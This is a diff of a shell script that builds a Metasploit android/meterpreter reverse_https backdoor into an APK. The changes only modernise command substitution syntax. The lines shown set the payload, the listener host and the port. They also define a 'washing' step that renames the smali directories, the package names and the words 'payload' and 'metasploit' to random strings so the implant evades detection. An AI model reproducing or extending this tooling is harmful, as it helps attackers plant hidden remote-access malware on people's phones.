@@ -11,7 +11,7 @@
 
 ### Input argument variables // setting default values ###
 PAYLOAD="android/meterpreter/reverse_https"
-LHOST=`ifconfig eth0 | grep 'inet' | cut -d: -f2 | awk '{print $2}'`
+LHOST=$(ifconfig eth0 | grep 'inet' | cut -d: -f2 | awk '{print $2}')
 LPORT="443"
 VERBOSE=0
 DEBUG=0
@@ -176,17 +176,17 @@ type apktool.jar >/dev/null 2>&1 || {
 ### Variables used for the washing process ###
 fullPath=$outFile
 APK=$(basename $fullPath)
-VAR1=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # smali dir renaming
-VAR2=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # smali dir renaming
-VAR3=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Payload.smali renaming
-VAR4=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Pakage name renaming 1
-VAR5=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Pakage name renaming 2
-VAR6=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Pakage name renaming 3
-VAR7=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # New name for word 'payload'
-VAR8=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # New name for word 'metasploit'
-JAR=`which apktool.jar`
+VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
+VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
+VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
+VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
+VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
+VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
+VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
+VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
+JAR=$(which apktool.jar)
 apkName=$(echo $APK | cut -f 1 -d '.')
-localAddresses=`ifconfig | grep 'inet' | cut -d: -f2 | awk '{print $2}'`
+localAddresses=$(ifconfig | grep 'inet' | cut -d: -f2 | awk '{print $2}')
 localAddArray=($localAddresses)
 
 ### APKTool to pull apart the package ###
